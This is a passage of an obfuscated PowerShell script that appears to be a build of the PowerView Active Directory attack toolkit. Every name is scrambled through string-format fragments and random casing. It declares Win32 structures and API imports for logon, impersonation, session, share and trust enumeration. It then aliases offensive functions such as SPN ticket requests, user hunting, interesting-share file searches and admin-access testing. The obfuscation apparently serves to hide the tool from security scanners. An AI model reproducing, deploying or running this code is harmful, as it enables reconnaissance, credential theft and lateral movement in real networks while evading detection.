    ("{3}{4}{1}{2}{0}" -f 'ount','eDeleted','Acc','SidT','yp')   = 6
    ("{0}{2}{3}{1}" -f'SidT','lid','yp','eInva')          = 7
    ("{3}{1}{0}{2}"-f 'eUn','dTyp','known','Si')          = 8
    ("{0}{1}{3}{2}"-f 'SidTy','peC','uter','omp')         = 9
}


${l`OcAl`GRou`P_`INFo_1} = &("{1}{0}"-f't','struc') ${M`od} ("{3}{1}{0}{2}{4}" -f'CALGROU','O','P_I','L','NFO_1') @{
    ("{2}{0}{1}"-f 'i1_','name','lgrp') = &("{0}{1}"-f 'fie','ld') 0 ("{0}{1}" -f 'Strin','g') -MarshalAs @(("{1}{0}" -f'WStr','LP'))
    ("{0}{3}{2}{1}"-f'lgrpi1','ent','omm','_c') = &("{1}{0}"-f 'eld','fi') 1 ("{1}{0}" -f 'ng','Stri') -MarshalAs @(("{1}{0}" -f'tr','LPWS'))
}


${LoCaL`GrOUP`_`MEmB`eRS`_INfo_2} = &("{0}{1}" -f'struc','t') ${M`od} ("{2}{0}{1}{3}{4}" -f 'P_M','EMBERS_','LOCALGROU','INF','O_2') @{
    ("{0}{2}{1}"-f'lg','i2_sid','rm') = &("{1}{0}"-f 'ld','fie') 0 ("{1}{0}"-f'tPtr','In')
    ("{3}{1}{0}{2}" -f'i2_s','rm','idusage','lg') = &("{0}{1}"-f'fie','ld') 1 ${s`i`d_`NA`mE_uSE}
    ("{0}{2}{4}{3}{1}" -f'lgr','andname','mi2_do','n','mai') = &("{1}{0}"-f'eld','fi') 2 ("{2}{0}{1}"-f 'rin','g','St') -MarshalAs @(("{0}{1}"-f 'LPW','Str'))
}


${d`SdO`maI`NflaG} = &("{1}{0}"-f'num','pse') ${m`Od} ("{0}{1}{2}{3}"-f'DsDomain.','F','l','ags') ("{2}{0}{1}" -f'n','t32','UI') @{
    ("{0}{1}{2}"-f 'IN_FOR','E','ST')       = 1
    ("{3}{0}{2}{1}"-f'_OUT','UND','BO','DIRECT') = 2
    ("{1}{2}{0}"-f'T','TREE_','ROO')       = 4
    ("{1}{0}{2}"-f 'R','P','IMARY')         = 8
    ("{0}{1}{3}{2}" -f 'N','ATIV','ODE','E_M')     = 16
    ("{2}{0}{4}{1}{3}"-f 'EC','IN','DIR','BOUND','T_')  = 32
} -Bitfield
${DsD`o`ma`iNtru`S`TTYPe} = &("{1}{0}"-f'num','pse') ${m`Od} ("{4}{0}{3}{2}{1}" -f 'oma','e','tTyp','in.Trus','DsD') ("{0}{2}{1}" -f'UI','2','nt3') @{
    ("{0}{2}{1}"-f'DOW','EL','NLEV')   = 1
    ("{1}{0}"-f 'VEL','UPLE')     = 2
    ("{0}{1}" -f 'M','IT')         = 3
    ("{0}{1}" -f 'D','CE')         = 4
}
${DsDOMaInTruStaTt`R`I`BuT`eS} = &("{0}{1}" -f 'p','senum') ${m`Od} ("{6}{2}{5}{7}{4}{3}{0}{1}" -f 'rib','utes','ma','tt','tA','in.','DsDo','Trus') ("{0}{1}" -f'UInt','32') @{
    ("{2}{3}{1}{4}{0}"-f'SITIVE','N_TRA','N','O','N')      = 1
    ("{1}{3}{0}{2}"-f'EVEL_O','UP','NLY','L')        = 2
    ("{1}{0}{2}"-f 'ILTE','F','R_SIDS')         = 4
    ("{3}{1}{0}{2}" -f'_TRANSITIV','OREST','E','F')   = 8
    ("{1}{0}{5}{2}{4}{3}"-f'R','CROSS_O','ANIZA','ON','TI','G')  = 16
    ("{3}{2}{0}{1}"-f'HIN_FOR','EST','T','WI')       = 32
    ("{4}{0}{3}{5}{1}{2}" -f'E','TERNA','L','AT_AS_E','TR','X')   = 64
}


${dS`_D`omai`N_tRUsts} = &("{1}{0}" -f 't','struc') ${M`od} ("{1}{0}{2}"-f'MAIN_TR','DS_DO','USTS') @{
    ("{2}{5}{4}{3}{0}{1}" -f'Domai','nName','N','s','tbio','e') = &("{1}{0}"-f 'ld','fie') 0 ("{0}{2}{1}"-f'St','ng','ri') -MarshalAs @(("{2}{1}{0}"-f'r','t','LPWS'))
    ("{0}{2}{1}"-f 'DnsDoma','Name','in') = &("{1}{0}"-f'ld','fie') 1 ("{1}{0}" -f 'ng','Stri') -MarshalAs @(("{1}{0}"-f'r','LPWSt'))
    ("{0}{1}" -f'Flag','s') = &("{0}{1}"-f 'f','ield') 2 ${DsD`omai`NFlAg}
    ("{2}{1}{0}" -f'ex','tInd','Paren') = &("{0}{1}"-f'fiel','d') 3 ("{1}{0}"-f 'Int32','U')
    ("{0}{3}{2}{1}"-f 'Tru','e','p','stTy') = &("{0}{1}"-f'fi','eld') 4 ${d`SdOmAi`NtRus`TType}
    ("{1}{2}{0}{3}" -f'te','Tru','stAttribu','s') = &("{0}{1}"-f'fie','ld') 5 ${d`sd`OMain`T`RuStAtTRIbUTES}
    ("{1}{2}{0}" -f'd','Dom','ainSi') = &("{0}{1}"-f'fie','ld') 6 ("{1}{0}" -f'r','IntPt')
    ("{1}{2}{0}" -f 'id','Doma','inGu') = &("{0}{1}"-f'fiel','d') 7 ("{1}{0}" -f 'uid','G')
}


${NeT`RE`soURCew} = &("{1}{0}"-f'truct','s') ${m`od} ("{2}{1}{0}{3}" -f 'URCE','ETRESO','N','W') @{
    ("{0}{2}{1}"-f 'dwS','ope','c') =         &("{0}{1}"-f'fiel','d') 0 ("{1}{0}"-f 'nt32','UI')
    ("{1}{0}"-f'wType','d') =          &("{1}{0}"-f 'ield','f') 1 ("{1}{0}" -f'Int32','U')
    ("{0}{2}{1}{4}{3}" -f'dwD','y','ispla','ype','T') =   &("{0}{1}"-f 'fie','ld') 2 ("{1}{0}"-f 'nt32','UI')
    ("{2}{1}{0}"-f'e','g','dwUsa') =         &("{0}{1}" -f 'f','ield') 3 ("{1}{0}{2}" -f'I','U','nt32')
    ("{1}{0}{3}{2}" -f 'calN','lpLo','me','a') =     &("{0}{1}" -f 'fi','eld') 4 ("{0}{1}{2}"-f'Str','in','g') -MarshalAs @(("{1}{0}"-f 'tr','LPWS'))
    ("{1}{0}{3}{2}" -f 'te','lpRemo','e','Nam') =    &("{0}{1}" -f 'fie','ld') 5 ("{0}{1}" -f 'Stri','ng') -MarshalAs @(("{2}{1}{0}" -f'tr','PWS','L'))
    ("{2}{1}{0}"-f 'ment','om','lpC') =       &("{1}{0}"-f 'ield','f') 6 ("{1}{0}"-f 'g','Strin') -MarshalAs @(("{0}{1}{2}" -f 'LP','W','Str'))
    ("{2}{1}{0}" -f'r','pProvide','l') =      &("{1}{0}" -f'ield','f') 7 ("{0}{1}" -f'St','ring') -MarshalAs @(("{2}{0}{1}" -f 'WS','tr','LP'))
}


${fUNct`I`O`Nd`E`FIni`TiOns} = @(
    (&("{0}{1}" -f 'fun','c') ("{0}{2}{1}" -f 'netap','2','i3') ("{2}{1}{0}{3}"-f 't','e','N','ShareEnum') ([Int]) @([String], [Int],  (GEt-vaRiabLe  Nfv).VaLUE.("{3}{1}{4}{2}{0}"-f 'e','k','yp','Ma','eByRefT').Invoke(), [Int],   (VAriabLe  ("IGX"+"7")  -VAlUeoN).("{0}{1}{2}" -f 'MakeByR','efTyp','e').Invoke(),  (get-vAriabLE  IgX7  ).VaLue.("{3}{4}{2}{0}{1}" -f'ByRefTy','pe','ke','M','a').Invoke(),   ( vARIaBle ("IG"+"X7")  ).VAlue.("{1}{2}{0}" -f 'yRefType','M','akeB').Invoke())),
    (&("{0}{1}"-f'fun','c') ("{1}{0}"-f'2','netapi3') ("{2}{0}{1}{3}{4}" -f'etWk','sta','N','UserEnu','m') ([Int]) @([String], [Int],   (  VAriABlE  NFV).VaLUe.("{2}{1}{0}"-f'Type','ByRef','Make').Invoke(), [Int],   (  gCi ("vari"+"a"+"bLe:igx7")).VAluE.("{0}{2}{1}{3}" -f 'M','fTyp','akeByRe','e').Invoke(),   $iGx7.("{2}{0}{1}{3}" -f 'ByRefT','y','Make','pe').Invoke(),  ( gET-vAriAblE  IgX7 -vAlUEo).("{1}{2}{3}{0}"-f 'RefType','Make','B','y').Invoke())),
    (&("{0}{1}" -f 'f','unc') ("{2}{1}{0}" -f 'pi32','eta','n') ("{1}{0}{2}{3}" -f 'essionE','NetS','n','um') ([Int]) @([String], [String], [String], [Int],  $nFV.("{4}{3}{2}{0}{1}" -f'yRefTyp','e','eB','ak','M').Invoke(), [Int],   ( GcI  vARiabLe:iGX7).VAlUE.("{3}{1}{0}{2}" -f 'fT','keByRe','ype','Ma').Invoke(),  (  vaRIABlE igx7 -VAl).("{2}{3}{0}{1}"-f'fTyp','e','Mak','eByRe').Invoke(),  ( vARIAblE igx7 ).VAlUe.("{0}{3}{2}{1}{4}" -f 'M','y','RefT','akeBy','pe').Invoke())),
    (&("{1}{0}" -f'nc','fu') ("{0}{2}{1}" -f'n','32','etapi') ("{3}{2}{0}{1}"-f'roupE','num','G','NetLocal') ([Int]) @([String], [Int],   $Nfv.("{4}{3}{0}{2}{1}"-f'e','pe','fTy','keByR','Ma').Invoke(), [Int],  (GEt-vARiaBlE iGx7 ).value.("{1}{0}{3}{2}"-f'k','Ma','efType','eByR').Invoke(),   $igX7.("{3}{1}{2}{0}" -f 'ByRefType','ak','e','M').Invoke(),  $igx7.("{0}{1}{3}{2}" -f'M','akeByRe','ype','fT').Invoke())),
    (&("{0}{1}" -f'fun','c') ("{0}{2}{1}" -f'neta','2','pi3') ("{6}{5}{1}{2}{3}{4}{0}" -f'ers','l','Group','GetMe','mb','a','NetLoc') ([Int]) @([String], [String], [Int],  (  vAriabLE ("N"+"fv")  -VALuEON  ).("{3}{2}{0}{4}{1}" -f'fT','e','eByRe','Mak','yp').Invoke(), [Int],  ( Gi VarIAbLe:IgX7).vALue.("{3}{2}{0}{1}" -f 'ByR','efType','ke','Ma').Invoke(),   ( gET-vARiABlE iGX7).VaLuE.("{1}{0}{2}"-f'k','Ma','eByRefType').Invoke(),  (  VARIaBlE IGX7  -ValuEo ).("{2}{0}{1}{3}" -f 'a','keByRefTy','M','pe').Invoke())),
    (&("{0}{1}" -f'fun','c') ("{2}{1}{0}"-f'pi32','ta','ne') ("{2}{0}{1}"-f 's','GetSiteName','D') ([Int]) @([String],  (  lS VariABLE:nfV ).VaLuE.("{1}{0}{2}{3}" -f'keByRefTy','Ma','p','e').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{1}{0}{2}"-f 'tapi3','ne','2') ("{4}{2}{0}{3}{6}{5}{1}" -f 'n','s','sE','ume','D','st','rateDomainTru') ([Int]) @([String], [UInt32],  ( ITEm ('V'+'A'+'Riable'+':nfV') ).vAlue.("{2}{1}{4}{3}{0}" -f'pe','y','MakeB','Ty','Ref').Invoke(),   (geT-VaRiablE  ('NF'+'V')  ).vaLue.("{1}{0}{3}{2}" -f'eB','Mak','ype','yRefT').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{1}{0}" -f'tapi32','ne') ("{0}{1}{3}{2}" -f'NetAp','iBuffe','ee','rFr') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'c','fun') ("{1}{0}"-f'api32','adv') ("{0}{1}{2}{4}{5}{3}{6}" -f 'C','onv','ert','ToString','S','id','Sid') ([Int]) @([IntPtr],  $z5wnB.("{1}{2}{3}{0}" -f'pe','M','akeB','yRefTy').Invoke()) -SetLastError),
    (&("{0}{1}"-f'fu','nc') ("{2}{1}{0}" -f '2','3','advapi') ("{1}{4}{3}{0}{2}"-f'Manag','Ope','erW','SC','n') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{1}{0}"-f 'unc','f') ("{2}{0}{1}"-f 'i','32','advap') ("{4}{3}{1}{0}{2}"-f'viceHand','er','le','loseS','C') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'unc','f') ("{1}{0}{2}" -f 'api','adv','32') ("{2}{1}{0}" -f 'r','onUse','Log') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],  $NFv.("{0}{3}{1}{2}"-f'MakeBy','f','Type','Re').Invoke()) -SetLastError),
    (&("{1}{0}" -f'nc','fu') ("{0}{2}{1}"-f'adv','2','api3') ("{3}{5}{2}{1}{4}{0}"-f'nUser','o','L','Impersona','ggedO','te') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{0}{1}" -f 'fun','c') ("{1}{2}{0}"-f'2','ad','vapi3') ("{1}{0}{2}{3}"-f'ver','Re','tTo','Self') ([Bool]) @() -SetLastError),
    (&("{0}{1}"-f 'fun','c') ("{0}{1}"-f'wtsa','pi32') ("{3}{2}{0}{1}{4}" -f'OpenServer','E','TS','W','x') ([IntPtr]) @([String])),
    (&("{1}{0}" -f'c','fun') ("{2}{1}{0}"-f '32','sapi','wt') ("{2}{5}{0}{1}{6}{3}{4}"-f'Enu','mer','W','sionsE','x','TS','ateSes') ([Int]) @([IntPtr],  $iGx7.("{2}{1}{0}"-f'ype','yRefT','MakeB').Invoke(), [Int],   ( get-chIlditeM VARIaBlE:nFV ).VALUE.("{0}{1}{3}{2}"-f 'Mak','e','Type','ByRef').Invoke(),   ( LS vaRIaBle:IgX7).vaLuE.("{3}{2}{0}{1}"-f 'p','e','akeByRefTy','M').Invoke()) -SetLastError),
    (&("{0}{1}" -f'fu','nc') ("{2}{1}{0}"-f '32','api','wts') ("{7}{2}{1}{3}{5}{4}{0}{6}" -f't','sionI','ySes','n','a','form','ion','WTSQuer') ([Int]) @([IntPtr], [Int], [Int],   $NFv.("{2}{0}{1}" -f 'keByRef','Type','Ma').Invoke(),  $IgX7.("{3}{2}{0}{1}"-f'fTyp','e','yRe','MakeB').Invoke()) -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{0}{1}{2}" -f 'wt','sapi','32') ("{4}{2}{3}{0}{1}"-f'oryE','x','FreeM','em','WTS') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{0}{1}"-f 'f','unc') ("{2}{1}{0}" -f 'sapi32','t','w') ("{2}{0}{1}{3}"-f 'r','ee','WTSF','Memory') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f'c','fun') ("{1}{0}{2}" -f'ap','wts','i32') ("{0}{2}{1}"-f'WTS','ver','CloseSer') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'fun','c') ("{0}{1}" -f 'Mp','r') ("{4}{0}{3}{1}{2}" -f 'NetAd','cti','on2W','dConne','W') ([Int]) @(${nEt`ReSo`UR`Cew}, [String], [String], [UInt32])),
    (&("{0}{1}"-f 'fu','nc') ("{0}{1}" -f'M','pr') ("{1}{3}{5}{2}{0}{4}"-f'lConnection','WNet','e','C','2','anc') ([Int]) @([String], [Int], [Bool])),
    (&("{0}{1}"-f'fu','nc') ("{2}{0}{1}"-f'ernel','32','k') ("{0}{1}{2}{3}" -f'Close','H','andl','e') ([Bool]) @([IntPtr]) -SetLastError)
)

${tY`pEs} = ${fUnc`TIon`DE`Fi`NitIonS} | &("{0}{3}{1}{2}" -f'Add-Win3','T','ype','2') -Module ${m`oD} -Namespace ("{1}{0}"-f '2','Win3')
${NET`API32} = ${tyP`eS}[("{0}{2}{1}" -f'netap','2','i3')]
${a`DVapI`32} = ${Typ`es}[("{1}{0}" -f'pi32','adva')]
${Wts`AP`I32} = ${tYp`es}[("{0}{1}"-f 'wtsapi3','2')]
${M`Pr} = ${Ty`pEs}['Mpr']
${KeR`NEL32} = ${ty`pES}[("{0}{1}{2}" -f'kern','el','32')]

&("{1}{3}{0}{2}" -f'Alia','Set','s','-') ("{2}{1}{0}{3}"-f 'd','Ad','Get-IP','ress') ("{1}{2}{3}{0}" -f's','Resolve-IPAd','dre','s')
&("{0}{2}{1}"-f'Set-Ali','s','a') ("{2}{1}{0}{3}{4}" -f 'nve','o','C','rt-NameT','oSid') ("{2}{0}{1}" -f'o-SI','D','ConvertT')
&("{0}{1}{2}{3}" -f 'Set-','Al','i','as') ("{3}{0}{2}{1}"-f't-S','me','idToNa','Conver') ("{3}{2}{0}{1}" -f'ertFro','m-SID','onv','C')
&("{0}{2}{1}" -f 'Set','Alias','-') ("{3}{4}{1}{2}{0}"-f 'ket','est-SP','NTic','R','equ') ("{0}{4}{2}{3}{1}"-f 'Ge','t','omainSP','NTicke','t-D')
&("{1}{0}{2}"-f '-A','Set','lias') ("{2}{1}{0}" -f 'NSZone','-D','Get') ("{0}{4}{1}{3}{2}"-f 'Get-Do','in','SZone','DN','ma')
&("{2}{0}{1}" -f'e','t-Alias','S') ("{1}{2}{0}{3}" -f'SRe','G','et-DN','cord') ("{2}{0}{4}{3}{1}{5}"-f 'et-D','o','G','DNSRec','omain','rd')
&("{3}{0}{1}{2}" -f'et-Ali','a','s','S') ("{1}{2}{0}"-f 'omain','Get-Ne','tD') ("{3}{1}{0}{2}" -f'ai','t-Dom','n','Ge')
&("{2}{0}{1}" -f 'lia','s','Set-A') ("{3}{5}{0}{7}{2}{1}{6}{4}"-f 'n','l','ro','Get-NetDomai','r','nCo','le','t') ("{2}{3}{0}{5}{4}{1}"-f'ainControl','r','Get','-Dom','e','l')
&("{0}{1}{2}"-f 'Se','t-','Alias') ("{0}{3}{2}{1}" -f'Get-','orest','tF','Ne') ("{2}{0}{1}" -f'r','est','Get-Fo')
&("{0}{2}{1}" -f 'Set','Alias','-') ("{4}{3}{5}{1}{2}{0}" -f 'n','ma','i','etF','Get-N','orestDo') ("{0}{2}{1}{4}{3}"-f'Get-F','estD','or','n','omai')
&("{0}{1}{2}"-f'Set-Al','i','as') ("{5}{0}{2}{3}{1}{4}" -f '-','es','NetFo','r','tCatalog','Get') ("{6}{3}{2}{0}{1}{5}{4}"-f'lCat','a','orestGloba','et-F','og','l','G')
&("{0}{2}{1}" -f'S','lias','et-A') ("{1}{2}{0}" -f 'er','Get-Net','Us') ("{2}{1}{3}{0}"-f'inUser','t-D','Ge','oma')
&("{0}{1}{2}" -f 'Se','t-A','lias') ("{2}{1}{0}{3}" -f 't-U','e','G','serEvent') ("{3}{1}{0}{4}{2}"-f'Ev','et-DomainUser','t','G','en')
&("{1}{0}{2}"-f '-Al','Set','ias') ("{0}{1}{2}{3}"-f 'Ge','t-Net','Comp','uter') ("{1}{3}{2}{0}"-f'ter','Ge','ainCompu','t-Dom')
&("{2}{1}{0}"-f'lias','et-A','S') ("{0}{2}{1}{3}"-f'Get-','Ob','AD','ject') ("{2}{3}{1}{0}"-f'Object','-Domain','G','et')
&("{1}{0}{2}"-f'Ali','Set-','as') ("{1}{2}{0}"-f '-ADObject','Se','t') ("{0}{4}{1}{2}{3}"-f'Set-Doma','Obj','ec','t','in')
&("{2}{1}{0}" -f 'ias','l','Set-A') ("{1}{0}{2}" -f 'bjectAc','Get-O','l') ("{2}{3}{1}{4}{0}"-f 'cl','e','Get-','DomainObj','ctA')
&("{0}{2}{1}{3}" -f'Set','Al','-','ias') ("{4}{3}{0}{2}{1}" -f 'ec','cl','tA','bj','Add-O') ("{2}{1}{0}{3}"-f 'nObjectA','mai','Add-Do','cl')
&("{2}{1}{0}"-f 'lias','A','Set-') ("{2}{0}{3}{1}"-f 'nvok','er','I','e-ACLScann') ("{5}{0}{4}{3}{1}{2}" -f'nd-','ainAc','l','estingDom','Inter','Fi')
&("{1}{0}{2}"-f'Al','Set-','ias') ("{0}{2}{3}{1}"-f 'Get','DMap','-','GUI') ("{2}{3}{1}{0}{4}" -f'GUID','in','Get-Dom','a','Map')
&("{0}{3}{2}{1}" -f 'Se','as','i','t-Al') ("{2}{0}{1}" -f 'NetO','U','Get-') ("{0}{2}{1}"-f 'G','inOU','et-Doma')
&("{2}{0}{1}" -f '-A','lias','Set') ("{1}{0}{2}" -f 'et-NetSit','G','e') ("{1}{4}{3}{0}{2}" -f 'inSit','G','e','ma','et-Do')
&("{1}{0}" -f 'et-Alias','S') ("{1}{2}{3}{0}" -f't','Get','-N','etSubne') ("{1}{2}{0}{3}" -f 'nSub','G','et-Domai','net')
&("{2}{0}{1}"-f'-Alia','s','Set') ("{1}{3}{2}{0}"-f'etGroup','G','t-N','e') ("{2}{0}{1}"-f 'Do','mainGroup','Get-')
&("{1}{0}{2}"-f 'et-Alia','S','s') ("{2}{1}{4}{0}{5}{3}"-f'nage','nd-M','Fi','SecurityGroups','a','d') ("{5}{4}{1}{7}{2}{3}{6}{0}{8}"-f'Secur','D','n','M','-','Get','anaged','omai','ityGroup')
&("{2}{1}{0}" -f'as','t-Ali','Se') ("{0}{3}{2}{1}" -f 'Get','er','mb','-NetGroupMe') ("{6}{0}{4}{1}{2}{5}{3}"-f'-Dom','Gr','ou','Member','ain','p','Get')
&("{1}{0}{2}"-f'et-Alia','S','s') ("{4}{2}{3}{0}{1}" -f 'erve','r','e','S','Get-NetFil') ("{4}{3}{2}{5}{6}{1}{0}"-f'rver','eSe','t-Doma','e','G','inFi','l')
&("{0}{1}" -f'Set-Alia','s') ("{2}{3}{1}{0}" -f 're','sha','Get-DF','S') ("{0}{5}{3}{2}{4}{1}"-f 'Get-','re','D','ain','FSSha','Dom')
&("{0}{2}{1}" -f 'Se','as','t-Ali') ("{2}{3}{0}{1}" -f 'G','PO','Ge','t-Net') ("{2}{3}{1}{0}"-f'inGPO','oma','Get-','D')
&("{2}{0}{1}" -f 'et-Alia','s','S') ("{2}{1}{0}{3}" -f'OG','tGP','Get-Ne','roup') ("{6}{3}{1}{4}{2}{0}{5}"-f 'o','ainG','Gr','-Dom','POLocal','up','Get')
&("{0}{1}{2}" -f'S','et-A','lias') ("{3}{1}{4}{5}{0}{2}"-f 'i','O','on','Find-GP','Loca','t') ("{6}{3}{1}{0}{4}{2}{5}"-f'i','a','calGroupMappin','et-Dom','nGPOUserLo','g','G')
&("{1}{2}{0}" -f 'lias','Set-','A') ("{2}{4}{0}{3}{1}" -f'OCompu','Admin','Find','ter','-GP') ("{6}{1}{2}{4}{3}{0}{5}" -f'ppin','nGPOCompu','terLocalG','pMa','rou','g','Get-Domai')
&("{1}{2}{0}" -f 'lias','S','et-A') ("{2}{0}{1}{3}"-f'-Log','g','Get','edOnLocal') ("{3}{2}{1}{4}{0}" -f 'dOn','og','-RegL','Get','ge')
&("{0}{2}{1}" -f'S','-Alias','et') ("{3}{4}{0}{1}{5}{2}{6}" -f '-Chec','kLocalAd','nAcc','In','voke','mi','ess') ("{3}{2}{0}{4}{1}" -f'AdminA','s','st-','Te','cces')
&("{1}{0}{2}"-f '-Alia','Set','s') ("{2}{1}{0}" -f 'ame','iteN','Get-S') ("{2}{3}{0}{4}{1}"-f'uterSi','ame','G','et-NetComp','teN')
&("{0}{2}{1}"-f 'Set-Ali','s','a') ("{1}{2}{0}" -f 'y','Get','-Prox') ("{3}{4}{0}{1}{2}" -f 'Re','g','Proxy','G','et-WMI')
&("{1}{0}{2}" -f'lia','Set-A','s') ("{0}{3}{2}{1}{4}" -f'Get-','d','stLogge','La','On') ("{0}{2}{1}{3}"-f'G','IRegLastLogged','et-WM','On')
&("{0}{1}{2}"-f 'S','et-A','lias') ("{1}{3}{0}{4}{5}{2}" -f'Cache','G','on','et-','dRDPConnect','i') ("{4}{1}{5}{3}{2}{0}"-f 'n','IRegCachedRDPC','tio','nnec','Get-WM','o')
&("{2}{1}{0}" -f'-Alias','et','S') ("{4}{3}{7}{0}{1}{2}{5}{6}" -f 'st','r','yMounte','e','Get-R','dDriv','e','gi') ("{2}{5}{0}{1}{4}{3}"-f'RegMo','u','Ge','tedDrive','n','t-WMI')
&("{1}{0}{2}{3}" -f'et','S','-Ali','as') ("{0}{2}{3}{4}{1}"-f 'G','cess','e','t-Ne','tPro') ("{1}{3}{2}{0}"-f'ss','Get-WM','Proce','I')
&("{0}{2}{1}" -f'Set-Al','s','ia') ("{3}{0}{2}{1}"-f'hreade','Function','d','Invoke-T') NE`W`-t`hr`EADedfuNcTIon
&("{2}{0}{1}"-f 'ia','s','Set-Al') ("{1}{4}{5}{0}{3}{2}"-f 'ke','I','ter','-UserHun','nv','o') ("{0}{4}{1}{3}{2}" -f'Fi','d','omainUserLocation','-D','n')
&("{2}{1}{3}{0}"-f's','i','Set-Al','a') ("{5}{0}{3}{1}{4}{2}"-f 'ke-Pr','ces','ter','o','sHun','Invo') ("{1}{2}{3}{0}{4}"-f 'oces','F','ind','-DomainPr','s')
&("{0}{1}{2}" -f 'Se','t-Alia','s') ("{0}{4}{1}{2}{3}{5}" -f 'Inv','-Eve','ntHunt','e','oke','r') ("{0}{3}{4}{1}{2}"-f 'Fi','omainUser','Event','nd','-D')
&("{1}{0}{2}"-f'l','Set-A','ias') ("{2}{3}{0}{1}{4}"-f 'S','hareF','Invoke','-','inder') ("{0}{3}{1}{2}"-f 'Fi','d-','DomainShare','n')
&("{1}{0}{2}" -f 'i','Set-Al','as') ("{2}{1}{0}{4}{3}"-f'-FileF','nvoke','I','er','ind') ("{6}{0}{1}{3}{4}{7}{2}{5}" -f'i','nd-In','ha','ter','estingDoma','reFile','F','inS')
&("{1}{0}{2}" -f 'et-','S','Alias') ("{1}{2}{5}{3}{4}{0}" -f 'alAdmin','Invoke-','E','ateLo','c','numer') ("{3}{6}{5}{2}{4}{0}{1}" -f 'oupMembe','r','c','Fi','alGr','omainLo','nd-D')
&("{2}{1}{3}{0}" -f'as','-A','Set','li') ("{2}{4}{3}{5}{0}{1}" -f'ru','st','Ge','tDom','t-Ne','ainT') ("{0}{3}{2}{1}{4}" -f 'G','Tr','main','et-Do','ust')
&("{0}{1}{2}" -f 'Set-A','lia','s') ("{2}{3}{1}{4}{5}{0}"-f 'tTrust','t-Ne','G','e','tFo','res') ("{2}{1}{3}{0}" -f'tTrust','or','Get-F','es')
&("{0}{2}{1}" -f'S','ias','et-Al') ("{0}{1}{3}{2}"-f 'Find-F','o','nUser','reig') ("{5}{6}{2}{1}{3}{0}{4}"-f'gn','ainFore','om','i','User','G','et-D')
&("{0}{1}{2}"-f 'S','et-Alia','s') ("{4}{3}{0}{2}{1}" -f 'gnGr','up','o','-Forei','Find') ("{2}{1}{4}{3}{0}" -f'pMember','nFor','Get-Domai','gnGrou','ei')
&("{2}{0}{1}"-f 't-Al','ias','Se') ("{3}{2}{0}{1}"-f '-M','apDomainTrust','voke','In') ("{2}{0}{3}{1}{4}" -f'-D','mainTrustMappi','Get','o','ng')
&("{0}{1}"-f 'Set-Alia','s') ("{0}{2}{3}{4}{1}" -f'G','cy','e','t-Dom','ainPoli') ("{5}{3}{0}{4}{1}{2}"-f 'Dom','Da','ta','-','ainPolicy','Get')

